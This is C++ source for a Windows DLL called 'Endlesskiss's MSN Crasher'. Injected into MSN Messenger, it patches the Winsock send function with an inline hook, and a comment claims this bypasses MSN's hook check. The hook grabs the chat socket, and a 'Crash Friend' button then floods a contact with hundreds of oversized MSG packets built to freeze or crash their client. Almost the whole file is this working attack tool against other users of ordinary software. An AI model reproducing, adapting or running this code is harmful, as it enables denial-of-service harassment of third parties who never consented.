#include <windows.h>
#include <stdio.h>
//#include <stdlib.h>
#include <iostream>
//#include <string.h>
#include <commctrl.h>

using namespace std;
//#pragma comment (linker, "/manifestdependency:\"type='win32' name='Microsoft.Windows.Common-Controls' version='6.0.0.0' processorArchitecture='*' publicKeyToken='6595b64144ccf1df' language='*'\"")
#if defined _M_IX86
#pragma comment(linker,"/manifestdependency:\"type='win32' name='Microsoft.Windows.Common-Controls' version='6.0.0.0' processorArchitecture='x86' publicKeyToken='6595b64144ccf1df' language='*'\"")
#elif defined _M_IA64
#pragma comment(linker,"/manifestdependency:\"type='win32' name='Microsoft.Windows.Common-Controls' version='6.0.0.0' processorArchitecture='ia64' publicKeyToken='6595b64144ccf1df' language='*'\"")
#elif defined _M_X64
#pragma comment(linker,"/manifestdependency:\"type='win32' name='Microsoft.Windows.Common-Controls' version='6.0.0.0' processorArchitecture='amd64' publicKeyToken='6595b64144ccf1df' language='*'\"")
#else
#pragma comment(linker,"/manifestdependency:\"type='win32' name='Microsoft.Windows.Common-Controls' version='6.0.0.0' processorArchitecture='*' publicKeyToken='6595b64144ccf1df' language='*'\"")
#endif
#pragma comment (lib, "comctl32")

#define STATIC_SOCKET 0
#define TEXT_SOCKET_ID 1
#define BUTTON_CRASH_FRIEND 2
#define TEXT_SENT_TIMES 3

//#define SEND_INDEFINITELY

//Constant strings for the controls.
const wchar_t ClassName[] = L"MSNSpammer", *Classes[] = { L"Static", L"Edit", L"Button", L"Static" }, *Texts[] = { 

L"Socket ID:\n", L"Socket ID here\n", L"Crash Friend", L"Waiting...\n" };
const int Styles[] = { 0, ES_CENTER | ES_NUMBER, 0, 0 };
const int Ycoords[] = { 10, 40, 70, 100 };

/* Prevent Crash Methods */
DWORD dwOldProtection;
unsigned char cOldAddress;
DWORD dwOldAddress;
HANDLE hCrashThread;
DWORD Address = (DWORD)GetProcAddress(GetModuleHandle(L"ws2_32.dll"), "send");
/* MSN has a check for hooks inside, this is a bypass */
DWORD PresenceIMEP = (DWORD)GetModuleHandle(L"PresenceIM.dll") + 0x63A5C;
unsigned int SocketID = 0;
HMODULE Module;
HWND hwnd;
bool Running = false;

void SetSocketID(int Value)
{
	SocketID = Value;
	SetDlgItemInt(hwnd, TEXT_SOCKET_ID, Value, 0);
}

void Exit()
{
	UnregisterClass(ClassName, Module);
	FreeLibraryAndExitThread(Module, 0);
}

void ExitWithError()
{
	MessageBoxA(0, "Error!", "Error!", MB_ICONEXCLAMATION);
	Exit();
}


__declspec(naked) void Hook()
{

	__asm
	{
		push ebp
			mov ebp,esp
			cmp dword ptr ds:[Running],1 //if (Running), return
			je End
			cmp dword ptr ds:[ebp+0x10],3 //if (PacketLength > 3)
			jle End
			mov eax,dword ptr ds:[ebp+0xC] //mov eax,[Buffer]
		cmp byte ptr ds:[eax],'M' //if (Buffer[0] == 'M')
			jne End
			inc eax
			cmp byte ptr ds:[eax],'S' //if (Buffer[1] == 'S')
			jne End
			inc eax
			cmp byte ptr ds:[eax],'G' //if (Buffer[2] == 'G')
			jne End
			push dword ptr ds:[ebp+0x8]
		call dword ptr ds:[SetSocketID] //SetSocketID(socketID)
End:
		jmp dword ptr ds:[Address]
	}
}

void NotifyClose(int SockID)
{
	SetDlgItemInt(hwnd, TEXT_SENT_TIMES, SockID, 0);
	if(SockID == SocketID)
		MessageBox(hwnd, L"MSN tries to close our socket!", L"Help me bypass!!!!", 0);
	//Running = false;
}

int GetDWORDLength(DWORD dw)
{
	char buffer[6];			//99k if you are lifeless
	ltoa((long)dw, buffer, 10);
	return strlen(buffer);
}

void CrashFriend(void)
{/*
	std::string CrashMsg = "MSG 107 N 1222";
	CrashMsg += "MIME-Version: 1.0";
	CrashMsg += "Content-Type: text/plain; charset=UTF-8";
	CrashMsg += "X-MMS-IM-Format: FN=Arial; EF=; CO=0; CS=86; PF=22";*/
	//std::string Text = ":'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(";
	std::string Text = "':'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(";//:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(:'(";

	SOCKET Socket = GetDlgItemInt(hwnd, TEXT_SOCKET_ID, 0, 0); //Get the socket ID
	int Sends = 0;
	int Errors = 0;
	int LastErrorsInARow = 0;
	SetDlgItemText(hwnd, TEXT_SENT_TIMES, L"Crashing...");
	Sleep(2500);
	while(true)
	{
		char Packet[1541];
		ZeroMemory(&Packet[0], 1541);
		//wsprintfA(Packet, "MSG 107 N %d\x0D\x0AMIME-Version: 1.0\x0D\x0A\x43ontent-Type: text/plain; charset=UTF-8\x0D\x0AX-MMS-IM-Format: FN=Arial; EF=; CO=0; CS=86; PF=22\x0D\x0A\x0D\x0A%s", 112 + strlen(Text.c_str()), Text.c_str());
		wsprintfA(Packet,
"MSG %d N %d\x0D\x0AMIME-Version: 1.0\x0D\x0A\x43ontent-Type: text/plain; charset=UTF-8\x0D\x0AX-MMS-IM-Format: FN=Arial; EF=; CO=0; CS=0; PF=22\x0D\x0A\x0D\x0A%s\x0",
(*(DWORD*)PresenceIMEP)/*(*(DWORD*)PresenceIMEP)++*/, strlen(Text.c_str()) - 40 - GetDWORDLength((*(DWORD*)PresenceIMEP)++), Text.c_str());
		//755E5C5A   C745 FC 03000000 MOV DWORD PTR SS:[EBP-4],3		
		int SendResults = send(Socket, Packet, strlen(Packet), 0);
		//77196DAB - f0 0f c7 0f                - lock cmpxchg8b [edi],		
		//SetDlgItemInt(hwnd, TEXT_SENT_TIMES, Sends, 0);
		Sleep(100);
		if(SendResults == SOCKET_ERROR /* || Sends > 230 */)
		{
			Sleep(100);
			LastErrorsInARow++;
			if(
				(Sends > 230) || // 230 valid sends should crash every computer, even powerful one as alon has
				LastErrorsInARow > 30 ) //probably disconnected him
			{
				//SetDlgItemInt(hwnd, TEXT_SENT_TIMES, Sends, 0);
				//SetDlgItemInt(hwnd, TEXT_SENT_TIMES, WSAGetLastError(), 0);
				SetDlgItemText(hwnd, BUTTON_CRASH_FRIEND, L"Crash Friend");
				SetDlgItemText(hwnd, TEXT_SENT_TIMES, L"Finished!");
				MessageBox(hwnd, L"You've crashed your friend!\nMaybe he's still online but his MSN is actually stuck :D",L"Success!", NULL);
				Running = false;
				ExitThread(0);
			}
		}
		else
		{
			LastErrorsInARow = 0;
			Sends++;
		}
	}
}

bool Confirm()
{
	return (MessageBox(hwnd, 
		TEXT("Doing this action can be very destructive and will PROBABLY crash your peer's MSN, continue?"), 
		TEXT("Confirm"), 
		MB_ICONQUESTION | MB_YESNO) == IDYES);
}

void FocusWindow(HWND hWindow);

LRESULT CALLBACK WndProc(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam)
{
	switch (Msg)
	{
		case WM_DESTROY:
			//Remove hook to prevent msn from crashing.
			
			Address -= 5;/*
			*(unsigned char*)Address = 0x8B;
			*(DWORD*)(Address+1) = 0xEC8B55FF;*/
			*(DWORD*)(Address+1) = dwOldAddress;
			*(unsigned char*)Address = cOldAddress;
			VirtualProtect((LPVOID)Address, 5, dwOldProtection, NULL);
			if(hCrashThread)
			{
				Running = false;
				TerminateThread(hCrashThread, 0);
			}
			PostQuitMessage(0);
			Exit();			
			break;

		case WM_COMMAND:
			if (LOWORD(wParam) == BUTTON_CRASH_FRIEND)
			{
				if(Running)
				{
					if(hCrashThread)
					{
						SetDlgItemText(hwnd, BUTTON_CRASH_FRIEND, L"Crash Friend");
						Running = false;
						TerminateThread(hCrashThread, 0);
					}
				}
				else if(Confirm())
				{
					Running = true;
					hCrashThread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)&CrashFriend, (LPVOID)NULL, 0, 0);
					SetDlgItemText(hwnd, BUTTON_CRASH_FRIEND, L"Stop");
				}
			}
			if (LOWORD(wParam) == TEXT_SENT_TIMES)
			{
				Running = false;
			}
			break;
	}

	return DefWindowProc(hWnd, Msg, wParam, lParam);
}

void Window()
{
	MSG Msg;
	WNDCLASSEX wcx;
	INITCOMMONCONTROLSEX iccex; //XP Manifest style.

	iccex.dwICC = ICC_STANDARD_CLASSES;
	iccex.dwSize = sizeof(INITCOMMONCONTROLSEX);
	
	ZeroMemory(&Msg, sizeof(MSG));
	ZeroMemory(&wcx, sizeof(WNDCLASSEX));

	wcx.cbSize           = sizeof(WNDCLASSEX);
	wcx.lpfnWndProc      = (WNDPROC)WndProc;
	wcx.hInstance        = Module;
	wcx.hCursor          = (HCURSOR)LoadImage(0,IDC_ARROW,IMAGE_CURSOR,0,0,LR_SHARED);
	wcx.hbrBackground    = (HBRUSH)COLOR_BTNSHADOW;
	wcx.lpszClassName    = ClassName;

	if (!RegisterClassEx(&wcx))
		ExitWithError();

	hwnd = CreateWindowEx(
		WS_EX_TOPMOST | WS_EX_TOOLWINDOW | WS_EX_APPWINDOW,
        ClassName,
        L"Endlesskiss's MSN Crasher",
		WS_SYSMENU,
		CW_USEDEFAULT, 
		CW_USEDEFAULT, 
		200,
		170,
        NULL,
        NULL,
        Module,
        NULL);

	ShowWindow(hwnd, SW_SHOWNORMAL);

	if (!InitCommonControlsEx(&iccex) || !hwnd)
		ExitWithError();

	HFONT Font = CreateFont(0, 0, 0, 0, 0, 0, 0, 0, DEFAULT_CHARSET, 0, 0, 0, 0, L"Comic Sans MS");
	for (int i = 0; i < 4; ++i)
		SendMessage(CreateWindowEx(0, Classes[i], Texts[i], WS_VISIBLE | WS_CHILD | Styles[i], 20, Ycoords[i], 150, (i ? 25 : 

120), hwnd, (HMENU)i, 0, 0), WM_SETFONT, (WPARAM)Font, TRUE);

	UpdateWindow(hwnd);

	VirtualProtect((LPVOID)Address, 5, PAGE_EXECUTE_READWRITE, &dwOldProtection);
	cOldAddress = *(unsigned char*)Address;
	*(unsigned char*)Address = 0xE9;
	dwOldAddress = *(DWORD*)(Address+1);
	*(DWORD*)(Address+1) = ((int)&Hook - Address) - 5;
	Address += 5;

/*
	DWORD old;
	VirtualProtect((LPVOID)dwCloseSocket, 5, PAGE_EXECUTE_READWRITE, &old);
	//*(unsigned char*)dwCloseSocket = 0xE9;
	*(DWORD*)(dwCloseSocket+1) = ((int)&BypassSocket - dwCloseSocket) - 5;
	dwCloseSocket += 5;
*/
	while (GetMessage(&Msg, 0, 0, 0) > 0)
    {
		TranslateMessage(&Msg);
		DispatchMessage(&Msg);
    }

	Exit();
}

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
					 )
{
      if(ul_reason_for_call == DLL_PROCESS_ATTACH)
	  {
		  Module = hModule;
		  CreateThread(0, 0, (LPTHREAD_START_ROUTINE)&Window, (LPVOID)NULL, 0, 0);
	  }

    /* Returns TRUE on success, FALSE on failure */
    return TRUE;
}